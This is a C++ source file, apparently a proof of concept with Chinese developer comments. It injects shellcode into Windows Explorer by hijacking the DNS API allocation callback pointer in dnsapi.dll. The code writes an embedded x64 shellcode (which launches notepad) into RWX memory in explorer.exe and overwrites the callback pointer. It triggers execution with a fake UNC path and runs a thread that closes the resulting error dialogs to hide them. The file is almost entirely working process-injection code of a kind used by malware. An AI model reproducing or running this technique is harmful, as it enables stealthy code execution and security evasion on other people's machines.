
/*
* 核心在于dnsapi.dll，很多进程都有，但是只有explrer有已知触发条件
* 找不到要改的结构的指针，x64dbg找到了，但是是0，没有意义
* ida 能在data段偏后的位置找到g_pDnsFreeFunction和g_pDnsAllocFunction两个指针
* 为什么动态扫不到？

*/

#include <Windows.h>
#include <ShObjIdl_core.h>

#include <iostream>

#include <ExDisp.h>
#include <Shlwapi.h>
#include <ShlGuid.h>
#include <TlHelp32.h>

#include "utils.h"
#include "ntStructs.h"

HRESULT GetDesktopShellView(REFIID riid, void** ppv) 
{
    HWND           hwnd;
    IDispatch* pdisp;
    IShellWindows* psw;
    VARIANT        vEmpty = {};
    IShellBrowser* psb;
    IShellView* psv;
    HRESULT        hr;

    *ppv = NULL;

    hr = CoCreateInstance(CLSID_ShellWindows,
        NULL, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&psw));

    if (hr == S_OK) {
        hr = psw->FindWindowSW(
            &vEmpty, &vEmpty,
            SWC_DESKTOP, (long*)&hwnd,
            SWFO_NEEDDISPATCH, &pdisp);

        if (hr == S_OK) {
            hr = IUnknown_QueryService(
                pdisp, SID_STopLevelBrowser, IID_PPV_ARGS(&psb));
            if (hr == S_OK) {
                hr = psb->QueryActiveShellView(&psv);
                if (hr == S_OK) {
                    hr = psv->QueryInterface(riid, ppv);
                    psv->Release();
                }
                psb->Release();
            }
            pdisp->Release();
        }
        psw->Release();
    }
    return hr;
}

HRESULT GetShellDispatch(IShellView* psv, REFIID riid, void** ppv)
{
    IShellFolderViewDual* psfvd;
    IDispatch* pdispBackground, * pdisp;;
    HRESULT              hr;

    *ppv = NULL;
    hr = psv->GetItemObject(
        SVGIO_BACKGROUND, IID_PPV_ARGS(&pdispBackground));

    if (hr == S_OK) {
        hr = pdispBackground->QueryInterface(IID_PPV_ARGS(&psfvd));
        if (hr == S_OK) {
            hr = psfvd->get_Application(&pdisp);
            if (hr == S_OK) {
                hr = pdisp->QueryInterface(riid, ppv);
                pdisp->Release();
            }
            psfvd->Release();
        }
        pdispBackground->Release();
    }
    return hr;
}

HRESULT ShellExecInExplorer(PCWSTR pszFile) 
{
    IShellView* psv;
    IShellDispatch2* psd;
    HRESULT         hr;
    BSTR            bstrFile;
    VARIANT         vtHide, vtEmpty = {};

    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);

    bstrFile = SysAllocString(pszFile);
    if (bstrFile == NULL) return E_OUTOFMEMORY;

    hr = GetDesktopShellView(IID_PPV_ARGS(&psv));
    if (hr == S_OK) {
        hr = GetShellDispatch(psv, IID_PPV_ARGS(&psd));
        if (hr == S_OK) {
            V_VT(&vtHide) = VT_INT;
            V_INT(&vtHide) = SW_HIDE;
            hr = psd->ShellExecute(
                bstrFile, vtEmpty, vtEmpty, vtEmpty, vtEmpty);
            psd->Release();
        }
        psv->Release();
    }
    SysFreeString(bstrFile);
    return hr;
}

// does the pointer reside in the .code section?
BOOL IsCodePtr(LPVOID ptr) 
{
    MEMORY_BASIC_INFORMATION mbi;
    DWORD                    res;

    if (ptr == NULL) return FALSE;

    // query the pointer
    res = VirtualQuery(ptr, &mbi, sizeof(mbi));
    if (res != sizeof(mbi)) return FALSE;

    return ((mbi.State == MEM_COMMIT) &&
        (mbi.Type == MEM_IMAGE) &&
        (mbi.Protect == PAGE_EXECUTE_READ));
}

LPVOID GetRemoteModuleHandle(DWORD pid, LPCWSTR lpModuleName) 
{
    HANDLE        ss;
    MODULEENTRY32W me;
    LPVOID        ba = NULL;

    ss = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);

    if (ss == INVALID_HANDLE_VALUE) return NULL;

    ZeroMemory(&me, sizeof(me));
    me.dwSize = sizeof(MODULEENTRY32W);

    if (Module32FirstW(ss, &me)) 
    {
        do {
            if (me.th32ProcessID == pid) 
            {
                //me.szModule[MAX_PATH - 1] = L'\0';
                //printf("me.szModule = %-10d | %d\n", lstrlenW(me.szModule), lstrlenW(lpModuleName));
                if (lstrcmpiW(me.szModule, lpModuleName) == 0) 
                {
                    printf("find equal dll names\n");
                    ba = me.modBaseAddr;
                    break;
                }
            }
        } while (Module32NextW(ss, &me));
    }
    CloseHandle(ss);
    return ba;
}

LPVOID GetDnsApiAddr(DWORD pid) 
{
    LPVOID                m, rm, va = NULL;
    PIMAGE_DOS_HEADER     dos;
    PIMAGE_NT_HEADERS     nt;
    PIMAGE_SECTION_HEADER sh;
    DWORD                 i, cnt, rva = 0;
    PULONG_PTR            ds;

    // does remote have dnsapi loaded?
    rm = GetRemoteModuleHandle(pid, L"DNSAPI.dll");
    if (rm == NULL) return NULL;
    printf("rm dnsdll addr:%p\n", rm);

    // load local copy
    m = LoadLibraryW(L"dnsapi.dll");
    dos = (PIMAGE_DOS_HEADER)m;
    nt = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);
    sh = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader +
        nt->FileHeader.SizeOfOptionalHeader);

    // locate the .data segment, save VA and number of pointers
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) 
    {
       // printf("sh[i].Name %s", (PCHAR)sh[i].Name);
        if (*(PDWORD)sh[i].Name == *(PDWORD)".data") 
        {
            printf("find the data section\n");

            ds = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);

            // 获取data段中的所有的指针的个数（假设data段全是指针）
            cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
            break;
        }
    }
    printf("data section addr : %p\n", ds);
    getchar();
    // for each pointer
    for (i = 0; i < cnt - 1; i++) 
    {
        if (ds[i] != 0 && ds[i + 1] != 0)
        {
            printf("%-10p  |  %-p\n", (LPVOID)ds[i], (LPVOID)ds[i + 1]);
            // if two pointers side by side are not to code, skip it
            if (!IsCodePtr((LPVOID)ds[i])) continue;
            if (!IsCodePtr((LPVOID)ds[i + 1])) continue;

            // calculate VA in remote process
            va = ((PBYTE)&ds[i] - (PBYTE)m) + (PBYTE)rm;
            break;
        }

    }
    printf("va addr %p", va);
    return va;
}

// for any "Network Error", close the window,因为poc在过程中执行unc路径会触发弹窗
VOID SuppressErrors(LPVOID lpParameter) 
{
    HWND hw;

    for (;;) {
        
        //hw = FindWindowExW(NULL, NULL, NULL, L"Network Error");
        hw = FindWindowExW(NULL, NULL, NULL, L"网络错误");
        if (hw != NULL) {
            PostMessage(hw, WM_CLOSE, 0, 0);
        }
    }
}

VOID dns_inject(LPVOID payload, DWORD payloadSize) 
{
    LPVOID dns, cs, ptr;
    DWORD  pid, cnt, tick, i, t;
    HANDLE hp, ht;
    SIZE_T wr;
    HWND   hw;
    WCHAR  unc[32] = { L'\\', L'\\' }; // UNC path to invoke DNS api

    // 1. obtain process id for explorer
    //    and try read address of function pointers
    GetWindowThreadProcessId(GetShellWindow(), &pid);
    ptr = GetDnsApiAddr(pid);
    printf("pid: %d\n", pid);

    // 2. create a thread to suppress network errors displayed
    ht = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)SuppressErrors, NULL, 0, NULL);

    // 3. if dns api not already loaded, try force 
    // explorer to load via fake UNC path
    if (ptr == NULL)
    {
        printf("ptr is null\n");
        tick = GetTickCount();  // 利用时间构造随机值
        for (i = 0; i < 8; i++) {
            unc[2 + i] = (tick % 26) + 'a';
            tick >>= 2;
        }
        printf("%ws", unc);
        getchar();
        ShellExecInExplorer(unc);
        ptr = GetDnsApiAddr(pid);
    }

    printf("ptr still null");
    if (ptr != NULL)
    {
        // 4. open explorer, backup address of dns function.
        //    allocate RWX memory and write payload
        hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

        cs = VirtualAllocEx(hp, NULL, payloadSize,
            MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(hp, cs, payload, payloadSize, &wr);

        printf("pid: %d wpmshellcode %p\n", pid,cs);
        getchar();

        // 5. overwrite pointer to dns function
        //    generate fake UNC path and trigger execution
        ReadProcessMemory(hp, ptr, &dns, sizeof(ULONG_PTR), &wr);
        WriteProcessMemory(hp, ptr, &cs, sizeof(ULONG_PTR), &wr);

        tick = GetTickCount();
        for (i = 0; i < 8; i++)
        {
            unc[2 + i] = (tick % 26) + L'a';
            tick >>= 2;
        }
        ShellExecInExplorer(unc);

        // 6. restore dns function, release memory and close process
        WriteProcessMemory(hp, ptr, &dns, sizeof(ULONG_PTR), &wr);
        VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
        CloseHandle(hp);
    }
    // 7. terminate thread
    TerminateThread(ht, 0);
}

int dnscallbackExecute() 
{
    unsigned char shellcode2[344] = {
    0x48, 0x8B, 0xC4, 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8D, 0x48, 0xD8, 0xC7, 0x40, 0xD8, 0x57, 0x69,
    0x6E, 0x45, 0xC7, 0x40, 0xDC, 0x78, 0x65, 0x63, 0x00, 0xC7, 0x40, 0xE0, 0x6E, 0x6F, 0x74, 0x65,
    0xC7, 0x40, 0xE4, 0x70, 0x61, 0x64, 0x00, 0xE8, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74,
    0x0C, 0xBA, 0x05, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x28, 0xFF, 0xD0, 0x33, 0xC0, 0x48,
    0x83, 0xC4, 0x48, 0xC3, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48,
    0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC,
    0x20, 0x48, 0x63, 0x41, 0x3C, 0x48, 0x8B, 0xD9, 0x4C, 0x8B, 0xE2, 0x8B, 0x8C, 0x08, 0x88, 0x00,
    0x00, 0x00, 0x85, 0xC9, 0x74, 0x37, 0x48, 0x8D, 0x04, 0x0B, 0x8B, 0x78, 0x18, 0x85, 0xFF, 0x74,
    0x2C, 0x8B, 0x70, 0x1C, 0x44, 0x8B, 0x70, 0x20, 0x48, 0x03, 0xF3, 0x8B, 0x68, 0x24, 0x4C, 0x03,
    0xF3, 0x48, 0x03, 0xEB, 0xFF, 0xCF, 0x49, 0x8B, 0xCC, 0x41, 0x8B, 0x14, 0xBE, 0x48, 0x03, 0xD3,
    0xE8, 0x87, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x25, 0x85, 0xFF, 0x75, 0xE7, 0x33, 0xC0, 0x48,
    0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x8B,
    0x7C, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x20, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5C, 0xC3, 0x0F, 0xB7,
    0x44, 0x7D, 0x00, 0x8B, 0x04, 0x86, 0x48, 0x03, 0xC3, 0xEB, 0xD4, 0xCC, 0x48, 0x89, 0x5C, 0x24,
    0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48,
    0x8B, 0xF9, 0x45, 0x33, 0xC0, 0x48, 0x8B, 0x50, 0x18, 0x48, 0x8B, 0x5A, 0x10, 0xEB, 0x16, 0x4D,
    0x85, 0xC0, 0x75, 0x1A, 0x48, 0x8B, 0xD7, 0x48, 0x8B, 0xC8, 0xE8, 0x35, 0xFF, 0xFF, 0xFF, 0x48,
    0x8B, 0x1B, 0x4C, 0x8B, 0xC0, 0x48, 0x8B, 0x43, 0x30, 0x48, 0x85, 0xC0, 0x75, 0xE1, 0x48, 0x8B,
    0x5C, 0x24, 0x30, 0x49, 0x8B, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x44, 0x8A, 0x01, 0x45,
    0x84, 0xC0, 0x74, 0x1A, 0x41, 0x8A, 0xC0, 0x48, 0x2B, 0xCA, 0x44, 0x8A, 0xC0, 0x3A, 0x02, 0x75,
    0x0D, 0x48, 0xFF, 0xC2, 0x8A, 0x04, 0x11, 0x44, 0x8A, 0xC0, 0x84, 0xC0, 0x75, 0xEC, 0x0F, 0xB6,
    0x0A, 0x41, 0x0F, 0xB6, 0xC0, 0x2B, 0xC1, 0xC3
    };

    dns_inject(shellcode2, sizeof(shellcode2));

    return 0;
}
